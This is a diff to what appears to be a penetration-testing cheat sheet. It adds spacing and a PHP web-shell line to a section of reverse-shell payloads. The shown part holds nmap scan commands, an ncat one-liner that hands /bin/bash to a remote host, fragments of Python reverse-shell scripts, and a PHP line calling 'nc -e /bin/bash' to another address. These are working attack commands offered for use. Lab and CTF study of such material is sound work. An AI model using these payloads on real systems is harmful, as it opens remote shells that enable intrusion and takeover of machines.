@@ -75,14 +75,17 @@ nmap -T5 192.168.10.0/24
 ```
 nmap -Pn -p- -sC -sV -T4 192.168.201.159 
 ```
+
 ### :open_file_folder: reverse shell
 
 ncat 
+
 ```
 ncat -e /bin/bash 192.168.10.58 8080
 ```
 
 python3(file)
+
 ```
 #!/usr/bin/python3
 from os import dup2
@@ -97,6 +100,7 @@ run(["/bin/bash","-i"])
 ```
 
 python(file)
+
 ```
 #!/usr/bin/env python
 import os
@@ -107,6 +111,13 @@ except:
         print 'ERROR...' 
 sys.exit(0) 
 ```
+
+php
+
+```
+<?php system(\"nc -e /bin/bash 192.168.49.162 80\"); ?>
+```
+
 ### :open_file_folder: Cron jobs
 
 ```
